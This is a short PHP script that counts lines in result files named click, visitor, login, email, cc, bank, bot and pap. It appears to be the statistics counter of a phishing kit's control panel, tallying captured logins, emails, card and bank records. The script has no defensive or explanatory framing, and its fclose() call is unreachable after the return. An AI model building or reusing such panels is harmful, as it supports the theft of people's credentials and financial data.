<?php
function count_c($filename) {
    $file = fopen($filename, "r");
    $click = fread($file, filesize($filename));
    $click = substr_count($click, "\n");
    return $click;
    fclose($file);
}
$click = count_c("../result/click.txt");
$visitor = count_c("../result/visitor.txt");
$login = count_c("../result/login.txt");
$email = count_c("../result/email.txt");
$cc = count_c("../result/cc.txt");
$bank = count_c("../result/bank.txt");
$bot = count_c("../result/bot.txt");
$pap = count_c("../result/pap.txt");
?>